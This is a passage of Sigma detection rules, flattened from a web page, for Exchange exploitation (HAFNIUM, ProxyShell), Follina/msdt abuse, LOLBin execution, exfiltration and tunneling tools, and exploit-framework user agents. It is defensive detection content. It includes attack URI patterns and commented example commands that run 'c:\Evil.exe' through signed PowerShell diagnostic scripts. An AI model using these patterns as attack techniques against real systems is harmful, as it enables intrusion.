' -uco ' - '\inetpub\wwwroot' condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1546 - attack.t1053 
<li><a href="#">title:Exchange Exploitation CVE-2021-28480 id: a2a9d722-0acb-4096-bccc-daaf91a5037b status: experimental description: Detects successful exploitation of Exchange vulnerability as reported in CVE-2021-28480 references: - author: Florian Roth date: 2021/05/14 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: '/owa/calendar/a' cs-method: 'POST' filter: sc-status: 503 condition: selection and not filter falsepositives: - Unknown level: critical 
<li><a href="#">title:Exchange Exploitation Used by HAFNIUM id: 67bce556-312f-4c81-9162-c3c9ff2599b2 status: experimental description: Detects exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity references: - - author: Florian Roth date: 2021/03/03 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-method: 'POST' c-uri|contains: '/owa/auth/Current/themes/resources/' selection2: cs-method: 'POST' c-uri|contains: '/owa/auth/Current/' c-useragent: - 'DuckDuckBot/1.0;+(+)' - 'facebookexternalhit/1.1+(+)' - 'Mozilla/5.0+(compatible;+Baiduspider/2.0;++)' - 'Mozilla/5.0+(compatible;+Bingbot/2.0;++)' - 'Mozilla/5.0+(compatible;+Googlebot/2.1;++' - 'Mozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+(like+Gecko)+(Exabot-Thumbnails)' - 'Mozilla/5.0+(compatible;+Yahoo!+Slurp;+)' - 'Mozilla/5.0+(compatible;+YandexBot/3.0;++)' - 'Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36' selection3: c-uri|contains: '/ecp/' cs-method: 'POST' c-useragent: - 'ExchangeServicesClient/0.0.0.0' - 'python-requests/2.19.1' - 'python-requests/2.25.1' selection4: c-uri|contains: - '/aspnet_client/' - '/owa/' cs-method: 'POST' c-useragent: - 'antSword/v2.1' - 'Googlebot/2.1+(+)' - 'Mozilla/5.0+(compatible;+Baiduspider/2.0;++)' selection5: c-uri|contains: - '/owa/auth/Current/' - '/ecp/default.flt' - '/ecp/main.css' cs-method: 'POST' selection6: cs-method: 'POST' c-uri|contains|all: - '/ecp/' - '.js' condition: 1 of selection* falsepositives: - Legitimate access to other web applications that use the same folder names as Exchange (e.g. owa, ecp) but are not Microsoft Exchange related level: high 
<li><a href="#">title:Exchange PowerShell Snap-Ins Used by HAFNIUM id: 25676e10-2121-446e-80a4-71ff8506af47 status: experimental description: Detects adding and using Exchange PowerShell snap-ins to export mailbox data by HAFNIUM author: FPT.EagleEye references: - - date: 2021/03/03 modified: 2021/08/09 tags: - attack.execution - attack.t1059.001 - attack.collection - attack.t1114 logsource: category: process_creation product: windows detection: selection: Image: '*\powershell.exe' CommandLine: '*add-pssnapin microsoft.exchange.powershell.snapin*' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Exchange ProxyShell Pattern id: 23eee45e-933b-49f9-ae1b-df706d2d52ef status: experimental description: Detects URL patterns that could be found in ProxyShell exploitation attempts against Exchange servers (failed and successful) references: - - - author: Florian Roth, Rich Warren date: 2021/08/07 modified: 2021/08/08 tags: - attack.initial_access logsource: category: webserver detection: selection_auto: c-uri|contains: '/autodiscover.json' selection_uri: c-uri|contains: - '/powershell' - '/mapi/nspi' - '/EWS' - 'X-Rps-CAT' selection: sc-status: 401 selection_poc: c-uri|contains: # since we don't know how it will appear in the log files, we'll just use all versions - 'autodiscover.json?@' - 'autodiscover.json%3f@' - '%3f@foo.com' - 'Email=autodiscover/autodiscover.json' - 'json?@foo.com' condition: selection_auto and selection_uri or selection_poc falsepositives: - Unknown level: medium 
<li><a href="#">title:Exchange Set OabVirtualDirectory ExternalUrl Property id: 9db37458-4df2-46a5-95ab-307e7f29e675 description: Rule to detect an adversary setting OabVirtualDirectory External URL property to a script in Exchange Management log author: Jose Rodriguez @Cyb3rPandaH status: experimental date: 2021/03/15 modified: 2021/11/15 references: - tags: - attack.persistence - attack.t1505.003 logsource: product: windows service: msexchange-management detection: selection: - 'Set-OabVirtualDirectory' - 'ExternalUrl' - 'Page_Load' - 'script' condition: all of selection falsepositives: - Unknown level: high 
<li><a href="#">title:Executable from Webdav id: aac2fd97-bcba-491b-ad66-a6edf89c71bf status: test description: 'Detects executable access via webdav6. Can be seen in APT 29 such as from the emulated APT 29 hackathon ' author: 'SOC Prime, Adam Swan' references: - - date: 2020/05/01 modified: 2021/11/27 logsource: product: zeek service: http detection: selection_webdav: - c-useragent|contains: 'WebDAV' - c-uri|contains: 'webdav' selection_executable: - resp_mime_types|contains: 'dosexec' - c-uri|endswith: '.exe' condition: selection_webdav and selection_executable falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Executable in ADS id: b69888d4-380c-45ce-9cf9-d9ce46e67821 status: test description: Detects the creation of an ADS data stream that contains an executable (non-empty imphash) author: Florian Roth, @0xrawsec references: - date: 2018/06/03 modified: 2021/12/08 logsource: product: windows category: create_stream_hash definition: 'Requirements: Sysmon config with Imphash logging activated' detection: selection: Hashes|contains: 'IMPHASH=' filter: Hashes|contains: 'IMPHASH=00000000000000000000000000000000' condition: selection and not filter fields: - TargetFilename - Image falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.s0139 - attack.t1564.004 
<li><a href="#">title:Executable Used by PlugX in Uncommon Location id: aeab5ec5-be14-471a-80e8-e344418305c2 status: test description: Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location author: Florian Roth references: - - date: 2017/06/12 modified: 2022/01/28 logsource: category: process_creation product: windows detection: selection_cammute: Image|endswith: '\CamMute.exe' filter_cammute: Image|contains: - '\Lenovo\Communication Utility\' - '\Lenovo\Communications Utility\' selection_chrome_frame: Image|endswith: '\chrome_frame_helper.exe' filter_chrome_frame: Image|contains: '\Google\Chrome\application\' selection_devemu: Image|endswith: '\dvcemumanager.exe' filter_devemu: Image|contains: '\Microsoft Device Emulator\' selection_gadget: Image|endswith: '\Gadget.exe' filter_gadget: Image|contains: '\Windows Media Player\' selection_hcc: Image|endswith: '\hcc.exe' filter_hcc: Image|contains: '\HTML Help Workshop\' selection_hkcmd: Image|endswith: '\hkcmd.exe' filter_hkcmd: Image|contains: - '\System32\' - '\SysNative\' - '\SysWow64\' selection_mc: Image|endswith: '\Mc.exe' filter_mc: Image|contains: - '\Microsoft Visual Studio' - '\Microsoft SDK' - '\Windows Kit' selection_msmpeng: Image|endswith: '\MsMpEng.exe' filter_msmpeng: Image|contains: - '\Microsoft Security Client\' - '\Windows Defender\' - '\AntiMalware\' selection_msseces: Image|endswith: '\msseces.exe' filter_msseces: Image|contains: - '\Microsoft Security Center\' - '\Microsoft Security Client\' - '\Microsoft Security Essentials\' selection_oinfo: Image|endswith: '\OInfoP11.exe' filter_oinfo: Image|contains: '\Common Files\Microsoft Shared\' selection_oleview: Image|endswith: '\OleView.exe' filter_oleview: Image|contains: - '\Microsoft Visual Studio' - '\Microsoft SDK' - '\Windows Kit' - '\Windows Resource Kit\' selection_rc: Image|endswith: '\rc.exe' filter_rc: Image|contains: - '\Microsoft Visual Studio' - '\Microsoft SDK' - '\Windows Kit' - '\Windows Resource Kit\' - '\Microsoft.NET\' condition: ( selection_cammute and not filter_cammute ) or ( selection_chrome_frame and not filter_chrome_frame ) or ( selection_devemu and not filter_devemu ) or ( selection_gadget and not filter_gadget ) or ( selection_hcc and not filter_hcc ) or ( selection_hkcmd and not filter_hkcmd ) or ( selection_mc and not filter_mc ) or ( selection_msmpeng and not filter_msmpeng ) or ( selection_msseces and not filter_msseces ) or ( selection_oinfo and not filter_oinfo ) or ( selection_oleview and not filter_oleview ) or ( selection_rc and not filter_rc ) fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.s0013 - attack.defense_evasion - attack.t1574.002 
<li><a href="#">title:Execute Arbitrary Binaries Using GUP Utility id: d65aee4d-2292-4cea-b832-83accd6cfa43 status: experimental description: Detects execution of the Notepad++ updater (gup) to launch other commands or executables author: Nasreddine Bencherchali references: - date: 2022/06/10 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\gup.exe' Image|endswith: '\explorer.exe' filter: Image|endswith: '\explorer.exe' CommandLine|contains: '\Notepad++\notepad++.exe' condition: selection and not filter falsepositives: - Other parent binaries using GUP not currently identified level: high tags: - attack.execution 
<li><a href="#">title:Execute Arbitrary Commands Using MSDT.EXE id: 258fc8ce-8352-443a-9120-8a11e4857fa5 status: experimental description: Detects processes leveraging the "ms-msdt" handler or the "msdt.exe" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability author: Nasreddine Bencherchali (rule) references: - - - date: 2022/05/29 modified: 2022/06/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\msdt.exe' - OriginalFileName: 'msdt.exe' selection_cmd_inline: CommandLine|contains: 'IT_BrowseForFile=' selection_cmd_answerfile: CommandLine|contains: ' PCWDiagnostic' selection_cmd_answerfile_param: CommandLine|contains: - ' /af ' - ' -af ' condition: selection_img and (selection_cmd_inline or all of selection_cmd_answerfile*) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Execute Code with Pester.bat id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e status: test description: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing) author: Julia Fomina, oscd.community references: - date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_module: Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'Pester' - 'Get-Help' cmd_execution: Image|endswith: '\cmd.exe' CommandLine|contains|all: - 'pester' - ';' get_help: CommandLine|contains: - 'help' - '?' condition: powershell_module or (cmd_execution and get_help) falsepositives: - Legitimate use of Pester for writing tests for Powershell scripts and modules level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1216 
<li><a href="#">title:Execute Files with Msdeploy.exe id: 646bc99f-6682-4b47-a73a-17b1b64c9d34 status: test description: Detects file execution using the msdeploy.exe lolbin author: Beyu Denis, oscd.community references: - - - date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'verb:sync' - '-source:RunCommand' - '-dest:runCommand' Image|endswith: '\msdeploy.exe' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium tags: - attack.execution - attack.t1218 
<li><a href="#">title:Execute From Alternate Data Streams id: 7f43c430-5001-4f8b-aaa9-c3b88f18fa5c status: experimental author: frack113 date: 2021/09/01 description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection references: - tags: - attack.defense_evasion - attack.t1564.004 logsource: category: process_creation product: windows detection: selection_stream: CommandLine|contains: 'txt:' selection_tools_type: CommandLine|contains|all: - 'type ' - ' > ' selection_tools_makecab: CommandLine|contains|all: - 'makecab ' - '.cab' selection_tools_reg: CommandLine|contains|all: - 'reg ' - ' export ' selection_tools_regedit: CommandLine|contains|all: - 'regedit ' - ' /E ' selection_tools_esentutl: CommandLine|contains|all: - 'esentutl ' - ' /y ' - ' /d ' - ' /o ' condition: selection_stream and (1 of selection_tools_*) falsepositives: - Unknown level: medium 
<li><a href="#">title:Execute Invoke-command on Remote Host id: 7b836d7f-179c-4ba4-90a7-a7e60afb48e6 status: experimental description: Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. references: - - author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection_cmdlet: ScriptBlockText|contains|all: - 'invoke-command ' - ' -ComputerName ' condition: selection_cmdlet falsepositives: - Legitimate script level: medium tags: - attack.lateral_movement - attack.t1021.006 
<li><a href="#">title:Execute MSDT Via Answer File id: 9c8c7000-3065-44a8-a555-79bcba5d9955 status: experimental description: Detects execution of "msdt.exe" using an answer file which is simulating the legitimate way of calling msdt via "pcwrun.exe" (For example from the compatibility tab) author: Nasreddine Bencherchali references: - date: 2022/06/13 logsource: category: process_creation product: windows detection: selection_cli: Image|endswith: '\msdt.exe' CommandLine|contains: '\WINDOWS\diagnostics\index\PCWDiagnostic.xml' selection_answer: CommandLine|contains: - ' -af ' - ' /af ' filter: ParentImage|endswith: '\pcwrun.exe' condition: all of selection* and not filter falsepositives: - Possible undocumented parents of "msdt" other than "pcwrun" level: high tags: - attack.defense_evasion - attack.t1218 - attack.execution 
<li><a href="#">title:Execute MSDT.EXE Using Diagcab File id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3 status: experimental description: Detects diagcab leveraging the "ms-msdt" handler or the "msdt.exe" binary to execute arbitrary commands as seen in CVE-2022-30190 author: GossiTheDog (rule), frack113 (sigma version) references: - date: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\msdt.exe' - OriginalFileName: 'msdt.exe' selection_cmd: CommandLine|contains|all: - '/cab' - '.diagcab' condition: all of selection_* falsepositives: - Legitimate usage of ".diagcab" files level: high tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Execute Pcwrun.EXE To Leverage Follina id: 6004abd0-afa4-4557-ba90-49d172e0a299 status: experimental description: Detects indirect command execution via Program Compatibility Assistant "pcwrun.exe" leveraging the follina (CVE-2022-30190) vulnerability author: Nasreddine Bencherchali references: - date: 2022/06/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\pcwrun.exe' CommandLine|contains: '../' condition: selection falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1218 - attack.execution 
<li><a href="#">title:Execution DLL of Choice Using WAB.EXE id: fc014922-5def-4da9-a0fc-28c973f41bfb description: This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry. status: experimental references: - - - date: 2020/10/13 modified: 2022/03/26 author: oscd.community, Natalia Shornikova logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: '\Software\Microsoft\WAB\DLLPath' filter: Details: '%CommonProgramFiles%\System\wab32.dll' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Execution from Suspicious Folder id: 3dfd06d2-eaf4-4532-9555-68aca59f57c4 status: experimental description: Detects a suspicious execution from an uncommon folder author: Florian Roth, Tim Shelton date: 2019/01/16 modified: 2022/05/26 references: - - - - tags: - attack.defense_evasion - attack.t1036 logsource: category: process_creation product: windows detection: selection: - Image|contains: - '\$Recycle.bin\' - '\config\systemprofile\' - '\Intel\Logs\' - '\RSA\MachineKeys\' - '\Users\All Users\' - '\Users\Default\' - '\Users\NetworkService\' - '\Users\Public\' - '\Windows\addins\' - '\Windows\debug\' - '\Windows\Fonts\' - '\Windows\Help\' - '\Windows\IME\' - '\Windows\Media\' - '\Windows\repair\' - '\Windows\security\' - '\Windows\System32\Tasks\' - '\Windows\Tasks\' - Image|startswith: 'C:\Perflogs\' false_positive: Image|startswith: 'C:\Users\Public\IBM\ClientSolutions\Start_Programs\' condition: selection and not false_positive fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Execution in Outlook Temp Folder id: a018fdc3-46a3-44e5-9afb-2cd4af1d4b39 status: experimental description: Detects a suspicious program execution in Outlook temp folder author: Florian Roth date: 2019/10/01 modified: 2021/06/27 tags: - attack.initial_access - attack.t1566.001 logsource: category: process_creation product: windows detection: selection: Image|contains: '\Temporary Internet Files\Content.Outlook\' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Execution in Webserver Root Folder id: 35efb964-e6a5-47ad-bbcd-19661854018d status: test description: Detects a suspicious program execution in a web service root folder (filter out false positives) author: Florian Roth date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|contains: - '\wwwroot\' - '\wmpub\' - '\htdocs\' filter: Image|contains: - 'bin\' - '\Tools\' - '\SMSComponent\' ParentImage|endswith: '\services.exe' condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Various applications - Tools that include ping or nslookup command invocations level: medium tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Execution Of Non-Existing File id: 71158e3f-df67-472b-930e-7d287acaa3e1 status: experimental description: Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process) author: Max Altgelt date: 2021/12/09 modified: 2022/03/08 references: - tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: image_absolute_path: Image|contains: '\' filter_null: Image: null filter_empty: Image: - '-' - '' filter_4688: - Image: - 'Registry' - 'MemCompression' - CommandLine: - 'Registry' - 'MemCompression' condition: not image_absolute_path and not 1 of filter* falsepositives: - Unknown level: high 
<li><a href="#">title:Execution of Powershell Script in Public Folder id: fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4 status: experimental description: This rule detects execution of PowerShell scripts located in the C:\Users\Public folder author: Max Altgelt references: - date: 2022/04/06 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: - '-f C:\Users\Public' - '-f "C:\Users\Public' - '-f %Public%' condition: selection fields: - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Execution of Renamed PaExec id: 7b0666ad-3e38-4e3d-9bab-78b06de85f7b status: test description: Detects execution of renamed paexec via imphash and executable product string author: Jason Lynch references: - sha256=01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc - date: 2019/04/17 modified: 2022/03/04 logsource: category: process_creation product: windows detection: selection1: Product|contains: 'PAExec' selection2: - Imphash: - 11D40A7B7876288F919AB819CC2D9802 - 6444f8a34e99b8f7d9647de66aabe516 - dfd6aa3f7b2b1035b76b718f1ddc689f - 1a6cca4d5460b1710a12dea39e4a592c - Hashes|contains: - IMPHASH=11D40A7B7876288F919AB819CC2D9802 - IMPHASH=6444f8a34e99b8f7d9647de66aabe516 - IMPHASH=dfd6aa3f7b2b1035b76b718f1ddc689f - IMPHASH=1a6cca4d5460b1710a12dea39e4a592c filter1: Image|contains: 'paexec' condition: (selection1 and selection2) and not filter1 falsepositives: - Unknown imphashes level: medium tags: - attack.defense_evasion - attack.t1036.003 - attack.g0046 - car.2013-05-009 
<li><a href="#">title:Execution Of Renamed Plink Binary id: 1c12727d-02bf-45ff-a9f3-d49806a3cf43 status: experimental description: Execution of a renamed version of the Plink binary author: Nasreddine Bencherchali references: - - date: 2022/06/06 logsource: category: process_creation product: windows detection: selection: OriginalFileName: 'Plink' filter: Image|endswith: '\plink.exe' condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1036 
<li><a href="#">title:Execution of Suspicious File Type Extension id: c09dad97-1c78-4f71-b127-7edb2b8e491a status: experimental description: Checks whether the image specified in a process creation event doesn't refer to an .exe file (caused by process ghosting or other unorthodox methods to start a process) author: Max Altgelt date: 2021/12/09 modified: 2022/06/20 references: - tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: known_image_extension: Image|endswith: - '.exe' - '.tmp' # sadly many installers use this extension filter_null: Image: null filter_image: # Windows utilities without extension Image: - 'Registry' - 'MemCompression' filter_empty: Image: - '-' - '' filter_starts: Image|startswith: 'C:\Windows\Installer\MSI' filter_pstarts: ParentImage|startswith: - 'C:\ProgramData\Avira\' - 'C:\Windows\System32\DriverStore\FileRepository\' filter_screensaver: Image|endswith: '.scr' filter_nvidia: Image|contains: 'NVIDIA\NvBackend\' Image|endswith: '.dat' filter_com: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' Image|endswith: '.com' filter_winscp: Image|endswith: '\WinSCP.com' filter_vscode: Image|contains|all: - 'C:\Users\' - '\AppData\' - '.tmp' - 'CodeSetup' filter_libreoffice: Image|endswith: '\program\soffice.bin' filter_emc_networker: Image: - 'C:\Program Files\EMC NetWorker\Management\GST\apache\cgi-bin\update_jnlp.cgi' - 'C:\Program Files (x86)\EMC NetWorker\Management\GST\apache\cgi-bin\update_jnlp.cgi' filter_winpakpro: Image|startswith: - 'C:\Program Files (x86)\WINPAKPRO\' - 'C:\Program Files\WINPAKPRO\' Image|endswith: '.ngn' filter_myq_server: Image: - 'C:\Program Files (x86)\MyQ\Server\pcltool.dll' - 'C:\Program Files\MyQ\Server\pcltool.dll' filter_visualstudio: Image|startswith: - 'C:\Program Files\Microsoft Visual Studio\' - 'C:\Program Files (x86)\Microsoft Visual Studio' Image|endswith: '.com' filter_msi_rollbackfiles: Image|startswith: 'C:\Config.Msi\' Image|endswith: - '.rbf' - '.rbs' filter_wsl: Image|contains|all: - '\AppData\Local\Packages\' - '\LocalState\rootfs\' filter_lzma_exe: Image|endswith: '\LZMA_EXE' condition: not known_image_extension and not 1 of filter* falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via CL_Invocation.ps1 (2 Lines) id: f588e69b-0750-46bb-8f87-0e9320d57536 description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - - tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'CL_Invocation.ps1' - 'SyncInvoke' condition: selection # PS > Import-Module c:\Windows\diagnostics\system\Audio\CL_Invocation.ps1 # PS > SyncInvoke c:\Evil.exe falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via CL_Invocation.ps1 id: 4cd29327-685a-460e-9dac-c3ab96e549dc description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - - tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'CL_Invocation.ps1' - 'SyncInvoke' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via CL_Invocation.ps1 id: a0459f02-ac51-4c09-b511-b8c9203fc429 description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/05/21 references: - - tags: - attack.defense_evasion - attack.t1216 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'CL_Invocation.ps1' - 'SyncInvoke' # Example Commandline: "powershell Import-Module c:\Windows\diagnostics\system\Audio\CL_Invocation.ps1; SyncInvoke c:\Evil.exe" condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via CL_Mutexverifiers.ps1 (2 Lines) id: 6609c444-9670-4eab-9636-fe4755a851ce description: Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - - tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'CL_Mutexverifiers.ps1' - 'runAfterCancelProcess' condition: selection # PS > Import-Module c:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1 # PS > runAfterCancelProcess c:\Evil.exe falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via CL_Mutexverifiers.ps1 id: 39776c99-1c7b-4ba0-b5aa-641525eee1a4 description: Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - - tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'CL_Mutexverifiers.ps1' - 'runAfterCancelProcess' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Execution via Diskshadow.exe id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 status: test description: Detects using Diskshadow.exe to execute arbitrary code in text file author: Ivan Dyachkov, oscd.community references: - - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows definition: 'Requirements: Sysmon ProcessCreation logging must be activated and Windows audit must Include command line in process creation events' detection: selection: Image|endswith: '\diskshadow.exe' CommandLine|contains: - '/s' - '-s' condition: selection fields: - CommandLine falsepositives: - False postitve can be if administrators use diskshadow tool in their infrastructure as a main backup tool with scripts. level: high tags: - attack.execution - attack.t1218 
<li><a href="#">title:Execution via stordiag.exe id: 961e0abb-1b1e-4c84-a453-aafe56ad0d34 status: experimental description: Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe references: - - tags: - attack.defense_evasion - attack.t1218 author: Austin Songer (@austinsonger) date: 2021/10/21 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\stordiag.exe' Image|endswith: - '\schtasks.exe' - '\systeminfo.exe' - '\fltmc.exe' filter: ParentImage|startswith: # as first is "Copy c:\windows\system32\stordiag.exe to a folder" - 'c:\windows\system32\' - 'c:\windows\syswow64\' condition: selection and not filter falsepositives: - Legitimate usage of stordiag.exe. level: high 
<li><a href="#">title:Execution via WorkFolders.exe id: 0bbc6369-43e3-453d-9944-cae58821c173 status: experimental description: Detects using WorkFolders.exe to execute an arbitrary control.exe references: - tags: - attack.defense_evasion - attack.t1218 author: Maxime Thiebaut (@0xThiebaut) date: 2021/10/21 logsource: category: process_creation product: windows definition: 'Requirements: Sysmon ProcessCreation logging must be activated' detection: selection: Image|endswith: '\control.exe' ParentImage|endswith: '\WorkFolders.exe' filter: Image: 'C:\Windows\System32\control.exe' condition: selection and not filter falsepositives: - Legitimate usage of the uncommon Windows Work Folders feature. level: high 
<li><a href="#">title:Exfiltration and Tunneling Tools Execution id: c75309a3-59f8-4a8d-9c2c-4c927ad50555 status: test description: Execution of well known tools for data exfiltration and tunneling author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\plink.exe' - '\socat.exe' - '\stunnel.exe' - '\httptunnel.exe' condition: selection falsepositives: - Legitimate Administrator using tools level: medium tags: - attack.exfiltration - attack.command_and_control - attack.t1041 - attack.t1572 - attack.t1071.001 
<li><a href="#">title:Exploit for CVE-2015-1641 id: 7993792c-5ce2-4475-a3db-a3a5539827ef status: stable description: Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641 author: Florian Roth references: - - date: 2018/02/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\WINWORD.EXE' Image|endswith: '\MicroScMgmt.exe' condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1036.005 
<li><a href="#">title:Exploit for CVE-2017-0261 id: 864403a1-36c9-40a2-a982-4c9a45f7d833 status: test description: Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262 author: Florian Roth references: - date: 2018/02/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\WINWORD.EXE' Image|contains: '\FLTLDR.exe' condition: selection falsepositives: - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders) level: medium tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Exploit for CVE-2017-8759 id: fdd84c68-a1f6-47c9-9477-920584f94905 status: test description: Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759 author: Florian Roth references: - - date: 2017/09/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\WINWORD.EXE' Image|endswith: '\csc.exe' condition: selection falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Exploit Framework User Agent id: fdd1bfb5-f60b-4a35-910e-f36ed3d0b32f status: test description: Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs author: Florian Roth references: - date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: # Cobalt Strike - 'Internet Explorer *' - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)' # # Metasploit Framework - Analysis by Didier Stevens - 'Mozilla/4.0 (compatible; Metasploit RSPEC)' - 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' # old browser, rare, base-lining needed - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' # old browser, rare, base-lining needed - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)' # old browser, rare, base-lining needed - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N' - 'Mozilla/5.0 (compatible; Googlebot/2.1; +)' # only use in proxy logs - not for detection in web server logs - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13' - 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)' # Payloads # Metasploit Update by Florian Roth 08.07.2017 - 'Mozilla/5.0' - 'Mozilla/4.0 (compatible; SPIPE/1.0' # - 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)' # too many false positives expected # - 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko' # too many false positives expected - 'Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0' - 'Sametime Community Agent' # Unknown if prone to false positives - used in - 'X-FORWARDED-FOR' - 'DotDotPwn v2.1' - 'SIPDROID' - 'Mozilla/5.0 